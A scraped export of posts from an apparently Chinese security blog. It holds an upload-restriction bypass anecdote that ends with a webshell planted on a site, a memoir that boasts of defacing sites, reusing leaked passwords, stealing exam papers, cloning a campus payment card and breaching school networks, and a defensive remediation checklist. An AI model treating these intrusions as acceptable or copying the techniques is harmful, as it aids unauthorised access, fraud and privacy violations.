密码是1337\n文章转载自: http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/\n","date":"2018-09-02T11:42:19Z","image":"https://w.wallhaven.cc/full/ex/wallhaven-ex277r.png","permalink":"https://360rce.github.io/p/vkxkois6/","title":"ecshop2.x代码执行"},{"content":"最近一直很忙，V老哥发来一个站，说有一个上传点，问我要不要玩玩，当时太忙，就没去看，等过了几个小时以后，他说还没有突破，然后我叫他把后台和帐号密码发给我试试。\n先打开后台看看，发现后台还是挺炫酷的。\n用帐号密码登录进后台，找到了上传的地方。\n打开burp，创建一个1.mp4文件，里面写phpinfo代码，然后发送到Repeater模块，点击go，可以发现是能够正常上传的。\n继续做测试，把文件名改成1.php;mp4\n然后访问一下该页面，发现显示的是源码。\n接下来上传了一个1.rar;mp4。\n访问以后是下载该文件，正常人到这一步都会怀疑可能存在解析漏洞，但是该文件夹下面没有脚本执行权限。\n接下来把文件名改成1.php试了下，发现上传回显还是mp4格式。\n陷入了沉思当中，仔细的看了数据包中的每一个参数，发现Cookie有点猫腻。\n于是我把php删除了，然后奇迹发生了。\n我访问看看，发现可以正常访问的。\n于是很激动的发给V哥这个地址，但是他却打不开。。。\n至于是什么原因应该是跟那个改了的Cookie有关，最后传了个马上去。\n后面的就不写了，我把马丢给V哥以后就不管事了。\n","date":"2018-08-22T19:08:19Z","image":"https://w.wallhaven.cc/full/vq/wallhaven-vqex23.jpg","permalink":"https://360rce.github.io/p/3dvjkhwx/","title":"记一个奇葩的上传点"},{"content":"嗯，一个文笔菜如老狗的我，我想写点什么，各位看官看看就好。\n今年20出头，我相信大家入这行大多数都是从刷钻还有帐号被盗开始，我也不例外。 记得读初三的时候，开始接触刷钻，那个时候都是用手机卡刷钻。读到高一的时候，也就是那个时候开始，算是刚接触这行吧。 那个时候找了个师傅，好像花了50。。。。不过那时候学生党没有多少钱。当时学刷宽带钻，还有什么入侵啥的，反正当时觉得特别牛逼。 还有什么入侵三字经，慢慢的发现，叫他教技术总是各种敷衍，后来知道了他是骗子以后，就把我拉黑了。当时为了刷宽带钻，抓鸡而买了一台服务器。\n记得那个时候，学习的地方叫做黑基，然后加了群，认识了一个群主叫小风的，还记得有个叫罪叔叔的，总是开玩笑的说卖河南大饼。不过，现在都没联系了。 在黑基里面，学过哪些东西我不记得了，只记得当时学什么UBB排版吧，当时写了一个QQ空间的登录页面，那时候读高一，网上认识的一个朋友和我说学习html吧，他也算是我的启蒙老师吧，反正那个时候不会的我都会问他。 不记得怎么接触渗透的了，记得有一次，用网上的什么0day，进了别人的后台，好像是个什么新闻的。发现首页有太多日本的字眼，然后我把首页改了，留了自己的ID和QQ号（那时候不懂事，勿喷），那个时候ID好像还叫灰灰（是以前的女朋友起的，现在想起来都觉得我这种大叔类型的人，为啥会用这个ID）。。。。 后来上课的时候接到一个电话，是那个网站站长打给我的，问我是不是灰灰，说我在他网站上面留下了QQ号，然后我吓得说了一句你打错了，我在上课，就挂了。 当时突然想拿自己的高中学校网站练手，好像就是那个时候认识了土司论坛的恋安，也就是你们说的xuehei大佬，现在想想，和他认识可能也快有5年了，也许更久吧。 我当时因为太菜，搞高中学校网站搞不下，然后叫恋安帮我，恋安说了一句从来没见过这么丑的网站。网站是学校老师自己用aspx写的。 嗯，老版的网站始终没搞下，现在网站也改新的了。 高中毕业后，163邮箱裤子出来了，之前查过学校的域名，是163邮箱注册的，然后用一个网站查到了密码，随手去后台地址试了试，登录成功。 起码拿到了学校网站的后台权限，至于shell吧，凡科建站，我是真的无奈。\n由于高中全部在折腾这方面的，学习直接没学，高考考了211，是分数，不是学校。进了一所二流的专科， 大一的时候，选了计算机网络技术，至于html和c语言啥的，我高中就学完了，现在什么都不记得了，反正直接考了个计算机二级C，没屁用的证书。 大一的时候，参加了叫赣安杯的比赛，一个人带着两个大二的学长。预赛是做题，当时太菜了，勉勉强强进了决赛。 在决赛的时候被老师坑了一波，他告诉我不用带电脑，比赛方会提供的，所以我们三个人就带了一台电脑去，是一个学长的，上面什么都没。在决赛被打得很惨。 不过很庆幸，在决赛上认识了vking和另一个老哥（这里不知道ID，不提名字了）。只记得当时v哥台式机都带去了。 大一第一次期末考试，莫名的慌，听说考不好会挂科，高考数学29的我，看到高数就头疼。 一次偶然的机会，帮教务处的主任装系统，知道了考试卷放在哪台电脑上，后来我神不知鬼不觉的把所有工程系的试卷和答案偷了出来。。。（考卷是随机抽的，最后考了经管系的试卷，只有专业课考了自己老师出的）\n后来看到碧哥破解学校的水卡，至于碧哥，后面再说吧。我当时也买了NFC设备，自己花了一个月的时间算一卡通的加密算法，一卡通有三个功能，吃饭，打水和洗澡。发现卡的数据是存放在卡里的，而且没有任何信息登记。当时去充卡的地方问那个人说我卡掉了，能不能帮我查下有没有人捡到我的卡用我的钱，那个人问我知不知道卡号，我说用名字不能查吗，他说办卡的时候没登记任何信息。我就走了，然后就你们懂的。。。。\n后来考驾照，土豆找我说他要日他们驾校，然后我们一起拿到了服务器权限，后来我也搞了学校驾校一波，但是不知道为什么没有太多妹子信息。\n记得有一次搞一个妹子的学校，拿到了内网权限，当时ms17-010刚出来，我全家桶都搬到服务器上去了，打算慢慢玩。后来，勒索病毒爆发，管理员加班几天，网站入口关了，因为没留后门，导致权限丢失。现在那妹子是我女朋友了。\n记得小时候说过会把小学毕业照挂到学校的网站首页上，刚开始太菜，拿不下。后来我做到了，本来打算挂首页一天，第二天会恢复，后来想想，让黑页留在根目录下吧，也算是怀念下自己的童年。现在网站域名到期了，昨晚看了下被其他学校注册了。。。。\n故事太多，文笔太烂，不知道怎么说，当初认识了渗透吧吧主，当时把我拉进了一个叫大风车的小群。 在群里认识了很多人，虽然没学到什么，但是大家都很开心的聊天。 但是，现在，进去的进去了，失踪的失踪了。发生了太多了。\n从当初在动车上看到的广告网站我都会动手，到现在看到网站都会苦笑。我真的变了。\n现在也毕业了，前几天刚谈转正工资，3k5。这么多年来，就值3k5，打算撤了。 也许会继续做这行，也许会离开这行。 这些年失去太多了，真的累了。\n","date":"2018-07-07T15:19:14Z","image":"https://w.wallhaven.cc/full/gp/wallhaven-gpm3r7.png","permalink":"https://360rce.github.io/p/bkl3vdxu/","title":"七年，当我们成为别人的背影时，我们失去了多少"},{"content":"{% note success %}人生几何，对酒当歌！{% endnote %}\n内容均来自互联网，风险等级根据实际情况定义\nSQL注入漏洞 风险级别：高危 漏洞描述： 当Web应用程序未对用户输入的数据进行足够的安全处理（如危险字符过滤或者语句过滤），而直接拼接SQL语句执行时，攻击者可以精心构造参数值，使服务器执行非预期的SQL语句并返回结果，造成数据库信息泄露。利用SQL注入漏洞，攻击者可获取数据库的增、删、改、查权限，甚至执行系统命令，上传后门文件等。\n加固建议： 针对SQL注入漏洞，需要对网站所有参数中提交的数据进行过滤，禁止输入\u0026quot;\u0026rsquo;\u0026quot;、\u0026ldquo;xor\u0026rdquo;、\u0026ldquo;or\u0026rdquo;、\u0026quot;\u0026ndash;\u0026quot;、\u0026quot;#\u0026quot;、\u0026ldquo;select\u0026rdquo;、\u0026ldquo;and\u0026quot;等特殊字符；所有的查询语句都使用数据库提供的参数化查询接口，SQL语句使用参数化处理后的数据作为输入,而不是将用户输入变量嵌入到SQL语句中；严格限制网站用户对数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害；避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者收集这些错误信息进行判断进而执行SQL注入攻击。\nXSS跨站脚本漏洞 风险级别：高危 漏洞描述： 跨站脚本攻击是通过在网页中加入恶意代码，当访问者浏览网页时恶意代码会被执行，攻击者可利用该漏洞窃取或操纵客户会话和 cookie，用来模仿合法用户，从而使攻击者获得管理员权限，控制整个网站。 加固建议： 1.在cookie中设置了HttpOnly属性，那么通过JavaScript脚本将无法读取到cookie信息，这样能一定程度上防止XSS攻击。 2.假定所有输入都是可疑的，必须对所有输入中的script、iframe等字样进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的cookie中的变量，HTTP请求头部中的变量等。 3.不仅验证数据的类型，还要验证其格式、长度、范围和内容。 4.过滤“\u0026lt;” 、“\u0026gt;” 将用户输入放入引号间，基本实现数据与代码隔离；过滤双引号防止用户跨越许可的标记，添加自定义标记；过滤TAB和空格,防止关键字被拆分；过滤script关键字；过滤\u0026amp;#,防止HTML属性绕过检查。在客户端和服务器端同时做数据的验证与过滤。 5.对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行安全检查。\nCRLF注入漏洞 风险级别：高危 漏洞描述： CRLF是”回车 + 换行”（\\r\\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。HRS是比XSS危害更大的安全问题。 加固建议： 针对CRLF注入漏洞，建议过滤\\r 、\\n等特殊字符，避免输入的数据污染到其他HTTP头。\nURL重定向钓鱼 风险级别：高危 漏洞描述： 通过构建URL，攻击者可以使用户重定向到任意URL，利用这个漏洞可以诱使用户访问某个页面，挂马、密码记录、下载任意文件等，常被用来钓鱼。 加固建议： 1.referer的限制 如果确定传递URL参数进入的来源，可以通过该方式实现安全限制，保证该URL的有效性，避免恶意用户自己生成跳转链接。 2.加入有效性验证Token 保证所有生成的链接都是来自于可信域的，通过在生成的链接里加入用户不可控的Token对生成的链接进行校验，可以避免用户生成自己的恶意链接从而被利用。 3.URL白名单，在白名单内才进行跳转\nHost头攻击漏洞 风险级别：高危 漏洞描述： 对开发人员来说，提取请求头中的Host参数写入当前页面是一个很不明智的选择。因为如果这样，攻击者就可以通过修改HTTP请求头中的Host字段，控制服务器返回页面中的URL。 加固建议： 不允许读取Host字段并写入页面。如有需要，应使用服务器脚本自带的SERVER_NAME变量。\n框架注入漏洞 风险级别：高危 漏洞描述： 攻击者有可能注入含有恶意内容的 frame 或 iframe 标签。如果用户不够谨慎，就有可能浏览该标签所对应的页面，但意识不到自己会离开原始站点而进入恶意的站点。之后，攻击者便可以诱导用户再次登录，然后获取其登录凭证。 加固建议： 建议过滤以下所有字符：| \u0026amp; ； $ % @ \u0026rsquo; \u0026quot; ' \u0026quot; \u0026lt;\u0026gt; () + CR LF , \\。\nCSRF跨站请求伪造漏洞（HTML表单没有CSRF保护） 风险级别：高危 漏洞描述： 攻击者可利用该漏洞模仿合法用户，从而使攻击者能够以该用户身份查看或变更用户记录以及执行事务。 加固建议： 1.使用验证码 使用验证码，那么每次操作都需要用户进行互动，可简单有效的防御CSRF攻击。 2.检测referer 通过检查Referer的值，我们就可以判断这个请求是合法的还是非法的 3.增加一个随机的token值 添加一个参数Token，其值是随机的。这样攻击者因为不知道Token而无法构造出合法的请求进行攻击。\n文件上传漏洞 风险级别：高危 漏洞描述： 验证上传文件的程序没有对上传文件作任何过滤，导致可以上传任意文件到服务器，甚至是病毒文件和木马文件。 加固建议： 对于上传的附件，验证程序要做严格验证，使用服务器端校验，而不能仅用前端javascript验证。 1.建议严格限制上传文件类型和上传文件名及后缀。 2.检查文件头和文件内容，对上传文件目录的运行权限进行严格限制。 3.及时排查、删除服务器木马文件。\n本地文件包含漏洞 风险级别：高危 漏洞描述： 由于程序员未对用户可控的变量进行输入检查，导致用户可以控制被包含的文件，成功利用时可以使web server将特定文件当成脚本执行，从而导致攻击者可获取一定的服务器权限；或直接读取系统文件，造成服务器敏感信息泄露。 加固建议： 针对文件包含漏洞，建议采用“白名单”的方式，限制允许包含的文件范围。\n远程文件包含漏洞 风险级别：高危 漏洞描述： 服务器通过语言的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严格，从而可以去包含一个恶意文件，攻击者就可以远程构造一个特定的恶意文件达到攻击目的。 加固建议： 如果一定要动态包含文件，建议最好明确规定包含哪些文件，进行白名单比对。同时，也可以在包含函数中加入目录限制。\nSSRF（服务端请求伪造） 风险级别：高危 漏洞描述： 很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器，探测内网信息甚至内网入侵。 加固建议： SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。建议对url参数值做严格的限制。\n任意文件读取漏洞 风险级别：高危 漏洞描述： 程序过滤不严，导致可以通过../../../等方式跳转到其他目录读取任意文件。 加固建议： 1.过滤”../”的特殊字符 2.限制读取文件的目录，不允许跨目录读取\n任意文件下载漏洞 风险级别：高危 漏洞描述： 在正常下载链接的文件参数前加 ../../../../ 来跳出目录限制，下载系统文件等任意文件。该漏洞是由于后台代码未对下载路径做安全限制引起的。 加固建议： 针对任意文件下载漏洞，建议严格限制文件下载路径。\nStruts2 dev-mod命令执行漏洞 风险级别：高危 漏洞描述： 网站封装采用Apache Struts xwork作为网站应用框架，且devMode为打开状态。当这个设置开启时，Struts2会提供更多的日志和调试信息来帮助开发者更快速的开发。 然而在开发者模式下，将允许OGNL语句注入，攻击者可能利用此漏洞进行远程代码执行。 加固建议： 1.升级最新版本； 2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。\nS2-005命令执行漏洞 风险级别：高危 漏洞描述： OGNL除其他功能外，还提供了广泛的表达评估功能。该漏洞允许恶意用户绕过构建在ParametersInterceptor中的“＃” - 使用保护，从而能够利用此漏洞进行远程代码执行。 加固建议： 1.升级最新版本； 2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。\nS2-009命令执行漏洞 风险级别：高危 漏洞描述： OGNL除其他功能外，还提供广泛的表达评估功能。该漏洞允许恶意用户绕过构建到ParametersInterceptor中的所有保护（正则表达式模式，拒绝方法调用），从而能够在任何公开的字符串变量中注入恶意表达式以进一步评估。 S2-003和S2-005中已经解决了类似的行为，但事实证明，基于白名单可接受的参数名称所产生的修复只是部分地关闭了漏洞。 正则表达式在ParametersInterceptor中匹配top [\u0026lsquo;foo\u0026rsquo;]（0）作为一个有效的表达式，OGNL把它视为（top [\u0026lsquo;foo\u0026rsquo;]）（0）并且将\u0026rsquo;foo\u0026rsquo;动作参数的值作为OGNL表达式来计算。这使得恶意用户可以将任意的OGNL语句放入任何由操作暴露的字符串变量中，并将其作为OGNL表达式进行求值，并且由于OGNL语句在HTTP参数值中，攻击者可以使用黑名单字符（例如＃）禁用方法执行并执行任意方法绕过了ParametersInterceptor和OGNL库的保护。 加固建议： 1.升级最新版本； 2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。\nS2-016命令执行漏洞 风险级别：高危 漏洞描述： 在struts2中，DefaultActionMapper类支持以\u0026quot;action:\u0026quot;、\u0026quot;#ff0000irect:\u0026quot;、\u0026quot;#ff0000irectAction:\u0026ldquo;作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。 加固建议： 1.升级最新版本； 2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。\nS2-017URL跳转漏洞 风险级别：高危 漏洞描述： 在2.3.15.1之前的Struts 2中，“#ff0000irect：”或“#ff0000irectAction：”之后的信息可以很容易地被操纵，以重定向到任意位置。 加固建议： 1.升级最新版本； 2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。\nS2-019命令执行漏洞 风险级别：高危 漏洞描述： Struts2的操作映射机制支持特殊参数前缀操作，这可能会在表格底部附加引导信息，在映射 \u0026ldquo;action:\u0026rdquo; 前缀操作时存在安全绕过漏洞，可被攻击者利用绕过某些安全限制访问受限制功能。Struts2的Dynamic Method Invocation机制是默认开启的（仅提醒用户如果可能的情况下关闭此机制）这样就存在远程代码执行漏洞，攻击者可利用此漏洞在受影响应用上下文中执行任意代码。 加固建议： 1.升级最新版本； 2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。\nS2-032命令执行漏洞 风险级别：高危 漏洞描述： 动态方法调用启用时，可能会传递一个恶意表达式，用于在服务器端执行任意代码。 加固建议： 1.升级最新版本； 2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。\nS2-037命令执行漏洞 风险级别：高危 漏洞描述： Struts2使用Rest插件之后，ActionMapping通过org.apache.struts2.rest.RestActionMapper.java类的publicActionMappinggetMapping(HttpServl etRequest request,ConfigurationManagerconfigManager)的方法获取的。其中，当请求url是如下的格式：actionName/id/methodName会获取methodName 作为ActionMapping的method属性。但method属性未做任何处理，同S2-032漏洞执行流程一致，都是将ActionMapping的属性设置到ActionProxy中，从ActionProxy中获取method属性带入到ognl表达式中执行，通过OGNL表达式静态调用获取ognl.OgnlContext的DEFAULT_MEMBER_ACCESS属性并覆盖_memberAccess的方式进行绕过，进而可在受控制的服务器端执行任意代码。即攻击者在部署了REST插件的Struts 2服务器上均可利用该漏洞远程执行任意命令 加固建议： 1.升级最新版本； 2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。\nS2-045命令执行漏洞 风险级别：高危 漏洞描述： 使用 Jakarta 文件上传插件的 Struts，攻击者可在上传文件时通过修改HTTP请求头中的 Content-Type 值来触发该漏洞，进而执行系统命令。 加固建议： 1.升级最新版本； 2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。\nS2-046命令执行漏洞 风险级别：高危 漏洞描述： 使用 Jakarta 文件上传插件的 Struts，攻击者可在上传文件的大小（由 Content-Length 头指定）大于 Struts2 允许的最大大小（2GB），文件名内容构造恶意的 OGNL 来触发该漏洞，进而执行系统命令。 加固建议： 1.升级最新版本； 2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。\nS2-052命令执行漏洞 风险级别：高危 漏洞描述： Struts2 REST 插件使用带有 XStream 程序的 XStream Handler 进行未经任何代码过滤的反序列化操作，这可能在反序列化XML payloads时导致远程代码执行。任意攻击者都可以构造恶意的XML内容提升权限。 加固建议： 1.升级最新版本； 2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。\nJDWP远程命令执行漏洞 风险级别：高危 漏洞描述： JDWP 是 Java Debug Wire Protocol 的缩写，它定义了调试器（debugger）和被调试的 Java 虚拟机（target vm）之间的通信协议。当对外开启该协议的Java调试模式时，存在远程命令执行漏洞。允许攻击者远程执行代码，获得服务器权限。 加固建议： 1.升级最新版本； 2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。\nElasticSearch命令执行漏洞 风险级别：高危 漏洞描述： 该漏洞存在于一个名为ElasticSearch.yml的文件，在这个文件中存在一个配置项“script.disable_dynamic”，默认为“false”。此默认配置允许服务器动态执行用户发送的任意代码。黑客只需要通过一个URL地址向服务器传送一段代码，就可以创建和执行他们自己的程序。一旦黑客获得通过，他们在服务器上的操作将不受任何限制，包括窃取网站中的用户账号及密码等敏感信息，或者留下一个后门程序。 加固建议： 1.升级最新版本； 2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。\nResin任意文件读取漏洞 风险级别：高危 漏洞描述： 安装某些版本Resin服务器的网站存在可读取任意文件的漏洞，攻击者利用该漏洞可以读取网站服务器的任意文件内容。 加固建议： 1.升级最新版本； 2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。\nGNU Bash远程命令执行 风险级别：高危 漏洞描述： GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行shell命令。 加固建议： 1.升级最新版本； 2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。\nUnicode 转换漏洞 风险级别：高危 漏洞描述： 在Unicode在转换时，由于超长字节序列和错误格式引起子序列的安全问题。通过特殊的编码格式绕过程序对恶意字符的检测，可以用在SQL注入、XSS等。 加固建议： 1.升级Unicode版本至官方最新稳定版本http://www.unicode.org 2.Unicode转化UTF-8编码后，对转换后进行安全检测，对特殊字符过滤或进行安全编码后输出。\n检测到网站被黑痕迹 风险级别：高危 漏洞描述： 网站页面已被篡改或已有入侵痕迹。 加固建议： 清除网站木马，全面检测网站漏洞并及时修复。\n使用被弃用的SSL 2.0协议 风险级别：高危 漏洞描述： 网站https使用了SSL 2.0协议。该协议非常老旧且已被弃用。该协议存在大量已知的安全漏洞，比如DROWN漏洞等。 加固建议： 禁用SSL 2.0或者使用SSL 3.0 或TLS 1.0代替。\nOpenSSL远程内存泄露漏洞（心脏滴血漏洞） 风险级别：高危 漏洞描述： OpenSSL是一款开放源码的SSL实现，用来实现网络通信的高强度加密。漏洞与OpenSSL TLS/DTLS传输层安全协议heartbeat扩展组件(RFC6520)相关，因此漏洞又被称为“heartbleed bug”（中文名称：“心血”漏洞）。该漏洞无需任何特权信息或身份验证，就可以获得X.509证书的私钥、用户名与密码、cookies等信息，进一步可直接从服务提供商和用户通讯中窃取聊天工具消息、电子邮件以及重要的商业文档和通信等私密数据。 加固建议： 升级OpenSSL版本到最新的1.0.1g；使用-DOPENSSL_NO_HEARTBEATS参数重新编译低版本的OpenSSL以禁用Heartbleed模块。\nJBoss Seam参数化EL表达式远程代码执行漏洞 风险级别：高危 漏洞描述： JBoss Seam是一个Java EE5框架，把JSF与EJB3.0组件合并在一起，从而为开发基于Web的企业应用程序提供一个最新的模式。 JBoss Seam处理某些参数化JBoss EL表达式的方式存在输入过滤漏洞（ CVE-2010-1871）。如果远程攻击者能够诱骗通过认证的JBoss Seam用户访问特制的网页，就可能导致执行任意代码 加固建议： 升级至4.3.0 EL4或以上更高的、确认已修复此漏洞的版本。参考链接：https://bugzilla.#ff0000hat.com/show_bug.cgi?id=615956\nWeblogic Java反序列化远程命令执行漏洞 风险级别：高危 漏洞描述： Weblogic存在Java反序列化漏洞，攻击者可以远程执行系统命令，获得服务器权限。 加固建议： 及时升级官方补丁。\nJBoss反序列化漏洞 风险级别：高危 漏洞描述： 根源在CommonsCollections组件中对于集合的操作存在可以进行反射调用的方法,并且该方法在相关对象反序列化时并未进行任何校验，导致远程代码执行。利用漏洞，允许攻击者远程执行系统命令，获得服务器权限，导致服务器运行安全风险。 加固建议： 1.针对JBoss Java反序列化漏洞，建议更新jboss版本到最新版（http://www.jboss.org/）或 更新官方补丁。 2.针对数据库帐号密码进行修改，要求密码长度8位数以上，密码复杂程度必须包含数字、大小写字母及特殊字符。 3.对服务器进行全面安全检查，及时排查、清除webshell等后门文件；及时修改数据库密码等。\nJBoss JMXInvokerServlet远程命令执行漏洞 风险级别：高危 漏洞描述： Jboss在默认安装的时候，会安装http-invoker.sar站点，当请求invoker/JMXInvokerServlet或invoker/EJBInvokerServlet会调用org.jboss.invocation.http.servlet.InvokerServlet.class处理请求。该类对GET请求和POST请求，统一调用processRequest函数处理，因此，攻击者需要自己构造一个jboss的类，并且将其序列化，然后将序列化的数据直接提交到存在漏洞站点的invoker/JMXInvokerServlet页面，恶意代码将会被执行。 加固建议： 建议删除或禁止访问/invoker/JMXInvokerServlet文件。\nApache ActiveMQ远程代码执行漏洞 (CVE-2016-3088) 风险级别：高危 漏洞描述： Apache ActiveMQ Fileserver 存在多个安全漏洞，可使远程攻击者用恶意代码替代Web应用，在受影响系统上执行远程代码（CVE-2016-3088）。 加固建议： 1.ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。 2.通过移除 conf\\jetty.xml 的以下配置来禁用 ActiveMQ Fileserver 功能\nApache Tomcat示例目录漏洞 风险级别：高危 漏洞描述： tomcat安装时默认的演示、文档页面，会造成信息泄露和XSS跨站脚本漏洞，攻击者可以创建、销毁或控制session。 加固建议： 删除相关功能演示页面。\nTomcat版本过低漏洞 风险级别：中危 漏洞描述： Tomcat由于版本过低存在安全漏洞。 加固建议： 升级Tomcat版本或及时打补丁。\nS2-053命令执行漏洞 风险级别：中危 漏洞描述： Apache Struts2 Freemarker标签如果被错误的配置使用，将会导致RCE远程代码执行漏洞。 加固建议： 1.升级到Apache Struts版本2.5.12或2.3.34 2.使用只读属性来初始化value属性（仅限getter属性） 3.Freemarker标签内容不要通过Request方式获取\nHPPT.sys远程代码执行漏洞（MS15-034） 风险级别：中危 漏洞描述： 远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。 影响以下版本操作系统的IIS服务器：Windows 7、Windows 8、Windows server 2008、Windows server 2012 加固建议： 用户安装微软官方修复补丁（3042553）。 https://support.microsoft.com/zh-cn/kb/3042553\nWebDav文件上传/信息泄露漏洞 风险级别：中危 漏洞描述： WebDAV是一种基于 HTTP 1.1协议的通信协议.它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法。使应用程序可直接对Web Server文件进行读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。远程攻击者可能利用此漏洞非授权读写文件。 加固建议： 通常情况下网站不需要支持额外的方法，建议禁用WebDav服务，关闭PUT、MOVE、COPY等方法。\nslowhttp拒绝服务攻击 风险级别：中危 漏洞描述： 如果远程攻击者使用发包工具向Apache服务器发送了不完整的HTTP请 求，服务器会打开连接等待接受完整的头，但如果发包工具不再继续发送完整请求而是发送无效头的话，就会一直保持打开的连接。这种攻击所造成的影响很严重， 因为攻击者不需要发送很大的通讯就可以耗尽服务器上的可用连接。也就是说，即使低带宽的用户也可以攻击大流量的服务器。 加固建议： 1.升级到最新版的apache 2.在httpd.conf中添加RequestReadTimeout header=20-40,MinRate=500 body=20,MinRate=500 3.直接在 iptables 中限制每个 IP 的连接数可以解决以上绝大部分问题，除非攻击者拥有众多肉鸡，否则单 IP 的攻击将失去效果。 iptables -A INPUT -p tcp \u0026ndash;syn \u0026ndash;dport 8889 -m connlimit \u0026ndash;connlimit-above 20 -j REJECT \u0026ndash;reject-with tcp-reset\njQuery版本过低（jQuery低版本存在跨站） 风险级别：中危 漏洞描述： jQuery 1.6.3之前版本中存在跨站脚本漏洞。当使用location.hash选择元素时，通过特制的标签，远程攻击者利用该漏洞注入任意web脚本或HTML。 加固建议： 升级jQuery版本。\n不安全的javascript库文件 风险级别：中危 漏洞描述： 该版本的javascript库存在多个安全漏洞 加固建议： 升级javascript库版本。\n传输层保护不足漏洞 风险级别：中危 漏洞描述： 传输层保护不足，会暴露传输的数据，导致数据被窃听，账号被盗等，如果是管理员的账号面临这个问题，那么将会导致整个网站处于数据暴露的状态，将对网站和用户造成严重的甚至无法挽回的损失。 加固建议： 1.对所有敏感的页面使用SSL，非SSL请求的页面应该被重定向到SSL请求的页面。 2.对所有敏感的Cookie，设置“secure”的flag。 3.保证SSL的提供商只支持强大的算法，这样就不能够被轻易破解。（使用标准的强算法） 4.确保您的证书是有效的，不过期，不被撤销，并匹配这个网站使用的所有域。 5.后台和其他的连接也应该使用SSL或其他加密技术。 6.即使是开发者的注释也应该很好的被保护，防止信息泄露。\n服务器启用了TRACE Method方法 风险级别：中危 漏洞描述：\n恶意攻击者可以通过TRACE Method返回的信息了解到网站前端的一些信息，如缓存服务器等，从而为下一步的攻击提供便利。 2.恶意攻击者可以通过TRACE Method进行XSS攻击 3.即使网站对关键页面启用了HttpOnly头标记和禁止脚本读取cookie信息，那么通过TRACE Method恶意攻击者还是可以绕过这个限制读取到cookie信息。 加固建议： 禁用TRACE方法。 点击劫持漏洞（X-Frame-Options头缺失） 风险级别：中危 漏洞描述： 通过覆盖不可见的框架误导受害者点击，受害者点击的是他所看到的网页，但其实他所点击的是被黑客精心构建的另一个置于原网页上面的透明页面。 加固建议： 设置X-Frame-Options值来防御利用iframe嵌套的点击劫持攻击。\n启用了不安全的HTTP方法（启用了OPTIONS方法） 风险级别：中危 漏洞描述： 开启了不安全的HTTP方法：DELTE/SEARCE/COPY，MOVE/PROPFIND/PROPPATCH/MKCOL/LOCK/UNLOCK/PUT，可能会在Web 服务器上上载、修改或删除Web 页面、脚本和文件。 加固建议： 如果服务器不需要支持WebDAV，请务必禁用它，或禁止不必要的HTTP 方法。\n域名访问限制不严格 风险级别：中危 漏洞描述： 目标存在域名访问限制不严格漏洞。Http请求的Hostname字段没有严格的域名限制，导致可以绕过一些防护措施。 加固建议： 配置WEB服务器，限制只能以域名形式访问服务器。\nSVN源代码泄露 风险级别：高危 漏洞描述： 造成SVN源代码漏洞的主要原因是管理员操作不规范。在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，黑客可以借助其中包含的用于版本信息追踪的‘entries’文件，逐步摸清站点结构。 更严重的问题在于，SVN产生的.svn目录下还包含了以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录），如果服务器没有对此类后缀做解析，黑客则可以直接获得文件源代码。 加固建议： 针对SVN信息泄露漏洞，建议删除WEB目录里的SVN文件或限制访问.svn目录，并升级SVN软件至1.7或以上更高版本\n.idea工程目录信息泄露漏洞 风险级别：高危 漏洞描述： .idea目录用来放置开发工程的一些配置文件，通常是.xml文件。其中workspace.xml里面存放一些开发者个人配置，比如开发路径、开发环境等。里面包含一些敏感信息。 加固建议： 生产环境中删除.idea目录及该目录下的文件，或配置网站服务器禁止访问.idea目录。\nASP.NET_Padding_Oracle信息泄露(MS10-070) 风险级别：高危 漏洞描述： ASP.NET由于加密填充验证过程中处理错误不当，导致存在一个信息泄漏漏洞。成功利用此漏洞的攻击者可以读取服务器加密的数据，例如视图状态。 